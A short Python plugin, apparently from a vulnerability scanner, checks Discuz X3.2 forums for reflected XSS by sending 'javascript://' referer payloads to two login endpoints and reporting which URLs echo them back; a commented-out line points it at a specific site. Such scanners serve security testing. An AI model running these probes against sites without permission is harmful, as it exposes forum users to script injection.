# coding:utf-8
#_PlugName_ = Disucz X3.2 多处反射型XSS漏洞

import requests

class Exploit:

    def attack(self, url):
        retList = []
        payload0 = "/member.php?mod=logging&action=login&referer=javascript://www.discuz.net/testvul"
        payload1 = "/connect.php?receive=yes&mod=login&op=callback&referer=javascript://www.discuz.net/testvul"
        verify_url = url + payload0
        verify_url2 = url + payload1

        response = requests.get(verify_url)
        response2 = requests.get(verify_url2)

        if response.status_code == 200 and "javascript://www.discuz.net/testvul" in response.text:
            retList.append(verify_url)
        if response2.status_code == 200 and "javascript://www.discuz.net/testvul" in response2.text:
            retList.append(verify_url2)

        if retList:
            return "Discuz X3.2 XSS in {}".format("\n".join(retList))

# print Exploit().attack("http://www.julihun.com")